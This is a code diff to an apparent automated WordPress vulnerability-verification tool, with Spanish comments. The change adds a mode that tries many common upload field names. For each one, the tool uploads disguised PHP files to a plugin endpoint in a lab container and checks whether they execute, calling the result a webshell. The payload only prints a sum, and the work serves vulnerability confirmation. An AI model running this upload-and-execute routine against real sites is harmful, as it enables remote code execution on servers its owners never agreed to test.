@@ -142,7 +142,12 @@ _XSS_HINTS = ("comment", "content", "message", "title", "name", "bio", "descript
 _XML_HINTS = ("xml", "feed", "data", "content", "body", "payload", "import")
 _REDIRECT_HINTS = ("redirect", "url", "return", "next", "target", "dest", "destination",
                    "continue", "go", "out", "location")
-_FILE_UPLOAD_HINTS = ("file", "upload", "avatar", "image", "attachment", "document", "photo")
+_FILE_UPLOAD_HINTS = (
+    "file", "upload", "avatar", "image", "attachment", "document", "photo",
+    "files", "media", "content", "data", "import", "thumbnail", "logo",
+    "async-upload", "mfile", "userfile", "uploadfile", "file_upload",
+    "upload_file", "img", "picture", "icon", "cover", "banner",
+)
 # Suffixes that signal the BINARY upload field vs the filename/path hint field
 # e.g. "file_url" > "file_name" — checked after the basic hints
 _UPLOAD_BINARY_SUFFIXES  = ("_url", "_content", "_data", "_binary", "_body", "_stream")
@@ -9307,18 +9312,21 @@ def verify_wordpress_file_upload(
 
     file_param = file_param_hint or _pick_param(parameters, _FILE_UPLOAD_HINTS)
     # Si se usa file_field_tpl, no hace falta file_param: el campo del fichero viene del template.
+    _probe_file_params: list = []  # candidatos a probar cuando no hay param conocido
     if not file_param and not file_field_tpl:
-        # Fallback: escanear el codigo fuente PHP del plugin buscando $_FILES['campo']
+        # Fallback 1: escanear el codigo fuente PHP del plugin buscando $_FILES['campo']
         file_param = _scan_php_files_field(plugin_source_dir)
         if file_param:
             step(f"[file-upload] campo detectado desde codigo fuente PHP: '{file_param}'")
     if not file_param and not file_field_tpl:
-        res.detail = "no se identifico el parametro (campo de formulario) del fichero subido"
-        res.limitations.append("la verificacion de file-upload necesita saber que campo lleva el "
-                               "fichero; afina 'parameters' en la hipotesis del LLM, usa "
-                               "file_param_hint, o define file_field_tpl para plugins con "
-                               "estructura de campo anidada (WordForm, WPForms, etc.)")
-        return res
+        # Fallback 2: probe mode — intentaremos en el lab todos los nombres comunes uno a uno.
+        # La confirmacion ocurre igual que siempre (grep del secreto dentro del contenedor), asi que
+        # no hay falsos positivos — si el secreto aparece, el campo era el correcto.
+        _probe_file_params = list(_FILE_UPLOAD_HINTS) + [
+            "async-upload", "files[]", "file[]", "attachment[]",
+        ]
+        file_param = _probe_file_params[0]  # empezamos por el primero; se sobreescribe en el loop
+        step(f"[file-upload] campo no detectado — modo probe: probando {len(_probe_file_params)} candidatos")
 
     lab = _Lab(_token())
     boot = None
@@ -9427,8 +9435,6 @@ def verify_wordpress_file_upload(
         def _subst(s: str, fname: str = "") -> str:
             return s.replace("{form_id}", _form_id).replace("{filename}", fname)
 
-        # Campo del fichero: si se pasó un template, lo usamos; si no, el file_param plano.
-        _actual_file_field = _subst(file_field_tpl) if file_field_tpl else (file_param or "file")
         # Datos bypass adicionales: se sustituyen los marcadores por cada intento.
         _extra_upload_resolved: dict = {
             _subst(k): _subst(v) if isinstance(v, str) else v
@@ -9441,78 +9447,92 @@ def verify_wordpress_file_upload(
 
         found = False
         tried = []
-        for tmpl, magic, content_type in variants:
-            token = _token()
-            fname = tmpl.format(t=token)
-            a, b = secrets.randbelow(8000) + 1000, secrets.randbelow(8000) + 1000
-            expected = a + b
-            php_payload = magic + f"<?php echo {a}+{b}; ?>".encode()
-            step(f"subiendo '{fname}' via campo '{_actual_file_field}' "
-                 f"(magic bytes={magic!r}, contenido PHP que calcula {a}+{b})...")
-            # extra_upload_data puede tener {filename}: sustituir por el nombre real del intento
-            _extra_per_attempt = {
-                _subst(k, fname): _subst(v, fname) if isinstance(v, str) else v
-                for k, v in _extra_upload_resolved.items()
-            }
-            _sess_to_use = _attack_sess if _attack_sess is not None else boot.sub_sess
-            # If companion name param found (e.g. file_name), inject fname into form data
-            _name_inject = {_companion_name_param: fname} if _companion_name_param else {}
-            try:
-                resp = _sess_to_use.request(
-                    m, boot.base_url + endpoint,
-                    data={**other_params, **_extra_per_attempt, **_name_inject},
-                    files={_actual_file_field: (fname, php_payload, content_type)}, timeout=20)
-            except Exception as e:
-                tried.append({"filename": fname, "error_subida": str(e)})
-                continue
-            found_path = lab.find_in_webroot(token)
-            _resp_snippet = (resp.text or "")[:200].replace("\n", " ").strip()
-            entry = {"filename": fname, "status_subida": resp.status_code,
-                    "encontrado_en_contenedor": found_path,
-                    "file_field_usado": _actual_file_field,
-                    "respuesta_servidor": _resp_snippet}
-            if not found_path:
-                if _resp_snippet:
-                    step(f"  → {resp.status_code} · respuesta: {_resp_snippet!r}")
+        # Probe mode: when no field was detected at analysis time, iterate over common
+        # candidates automatically. Quick single-variant probe per candidate; full set once found.
+        _probe_candidates = _probe_file_params if _probe_file_params else [file_param or "file"]
+        for _probe_candidate in _probe_candidates:
+            if _probe_file_params:
+                step(f"[probe] probando campo '{_probe_candidate}'...")
+            _actual_file_field = _subst(file_field_tpl) if file_field_tpl else _probe_candidate
+            # In probe mode: use just 2 variants per candidate to stay fast; full set once confirmed
+            _probe_variants = variants[:2] if _probe_file_params else variants
+            for tmpl, magic, content_type in _probe_variants:
+                token = _token()
+                fname = tmpl.format(t=token)
+                a, b = secrets.randbelow(8000) + 1000, secrets.randbelow(8000) + 1000
+                expected = a + b
+                php_payload = magic + f"<?php echo {a}+{b}; ?>".encode()
+                step(f"subiendo '{fname}' via campo '{_actual_file_field}' "
+                     f"(magic bytes={magic!r}, contenido PHP que calcula {a}+{b})...")
+                # extra_upload_data puede tener {filename}: sustituir por el nombre real del intento
+                _extra_per_attempt = {
+                    _subst(k, fname): _subst(v, fname) if isinstance(v, str) else v
+                    for k, v in _extra_upload_resolved.items()
+                }
+                _sess_to_use = _attack_sess if _attack_sess is not None else boot.sub_sess
+                # If companion name param found (e.g. file_name), inject fname into form data
+                _name_inject = {_companion_name_param: fname} if _companion_name_param else {}
+                try:
+                    resp = _sess_to_use.request(
+                        m, boot.base_url + endpoint,
+                        data={**other_params, **_extra_per_attempt, **_name_inject},
+                        files={_actual_file_field: (fname, php_payload, content_type)}, timeout=20)
+                except Exception as e:
+                    tried.append({"filename": fname, "error_subida": str(e)})
+                    continue
+                found_path = lab.find_in_webroot(token)
+                _resp_snippet = (resp.text or "")[:200].replace("\n", " ").strip()
+                entry = {"filename": fname, "status_subida": resp.status_code,
+                        "encontrado_en_contenedor": found_path,
+                        "file_field_usado": _actual_file_field,
+                        "respuesta_servidor": _resp_snippet}
+                if not found_path:
+                    if _resp_snippet:
+                        step(f"  → {resp.status_code} · respuesta: {_resp_snippet!r}")
+                    tried.append(entry)
+                    continue
+                rel = found_path.replace("/var/www/html", "", 1)
+                candidate_url = boot.base_url + rel
+                entry["url_publica"] = candidate_url
+                step(f"'{fname}' se guardo en {found_path}; pidiendolo directo para ver si se EJECUTA...")
+                try:
+                    import requests as _requests
+                    r2 = _requests.get(candidate_url, timeout=15)
+                except Exception as e:
+                    entry["error_peticion_directa"] = str(e)
+                    tried.append(entry)
+                    continue
+                pattern = re.compile(rf"(?<!\d){expected}(?!\d)")
+                executed = bool(pattern.search(r2.text or ""))
+                entry["status_peticion_directa"] = r2.status_code
+                entry["suma_esperada"] = expected
+                entry["suma_presente"] = executed
                 tried.append(entry)
-                continue
-            rel = found_path.replace("/var/www/html", "", 1)
-            candidate_url = boot.base_url + rel
-            entry["url_publica"] = candidate_url
-            step(f"'{fname}' se guardo en {found_path}; pidiendolo directo para ver si se EJECUTA...")
-            try:
-                import requests as _requests
-                r2 = _requests.get(candidate_url, timeout=15)
-            except Exception as e:
-                entry["error_peticion_directa"] = str(e)
-                tried.append(entry)
-                continue
-            pattern = re.compile(rf"(?<!\d){expected}(?!\d)")
-            executed = bool(pattern.search(r2.text or ""))
-            entry["status_peticion_directa"] = r2.status_code
-            entry["suma_esperada"] = expected
-            entry["suma_presente"] = executed
-            tried.append(entry)
-            if executed:
-                found = True
-                res.evidence["filename_ganador"] = fname
-                res.evidence["url_publica_ganadora"] = candidate_url
-                res.evidence["status_code_respuesta"] = r2.status_code
-                res.evidence["respuesta_cuerpo_recorte"] = (r2.text or "")[:500]
-                step(f"VERIFICADO: {candidate_url} devolvio {expected} (={a}+{b}) -- el fichero "
-                     f"subido se EJECUTA como PHP, no se sirve como archivo estatico.")
-                # Captura HTTP del webshell ejecutándose
-                _capture_exploit_shot(
-                    boot, "GET", rel, r2, highlight=str(expected),
-                    caption_es=(f"Paso 5 (CLAVE): FILE UPLOAD CONFIRMADO — '{fname}' "
-                                f"ejecuta como PHP y devuelve {expected} (={a}+{b}). "
-                                f"URL publica: {candidate_url}"),
-                    caption_en=(f"Step 5 (KEY): FILE UPLOAD CONFIRMED — '{fname}' "
-                                f"executes as PHP returning {expected} (={a}+{b}). "
-                                f"Public URL: {candidate_url}"))
-                boot.capture(boot.sub_sess, rel,
-                       f"Paso 5b: FILE UPLOAD (navegador) — webshell ejecuta {expected}={a}+{b}.",
-                       f"Step 5b: FILE UPLOAD (browser) — webshell executes {expected}={a}+{b}.")
+                if executed:
+                    found = True
+                    if _probe_file_params:
+                        step(f"[probe] campo correcto encontrado: '{_probe_candidate}'")
+                        res.evidence["file_param"] = _probe_candidate
+                    res.evidence["filename_ganador"] = fname
+                    res.evidence["url_publica_ganadora"] = candidate_url
+                    res.evidence["status_code_respuesta"] = r2.status_code
+                    res.evidence["respuesta_cuerpo_recorte"] = (r2.text or "")[:500]
+                    step(f"VERIFICADO: {candidate_url} devolvio {expected} (={a}+{b}) -- el fichero "
+                         f"subido se EJECUTA como PHP, no se sirve como archivo estatico.")
+                    # Captura HTTP del webshell ejecutándose
+                    _capture_exploit_shot(
+                        boot, "GET", rel, r2, highlight=str(expected),
+                        caption_es=(f"Paso 5 (CLAVE): FILE UPLOAD CONFIRMADO — '{fname}' "
+                                    f"ejecuta como PHP y devuelve {expected} (={a}+{b}). "
+                                    f"URL publica: {candidate_url}"),
+                        caption_en=(f"Step 5 (KEY): FILE UPLOAD CONFIRMED — '{fname}' "
+                                    f"executes as PHP returning {expected} (={a}+{b}). "
+                                    f"Public URL: {candidate_url}"))
+                    boot.capture(boot.sub_sess, rel,
+                           f"Paso 5b: FILE UPLOAD (navegador) — webshell ejecuta {expected}={a}+{b}.",
+                           f"Step 5b: FILE UPLOAD (browser) — webshell executes {expected}={a}+{b}.")
+                    break
+            if found:
                 break
         res.evidence["intentos"] = tried
 
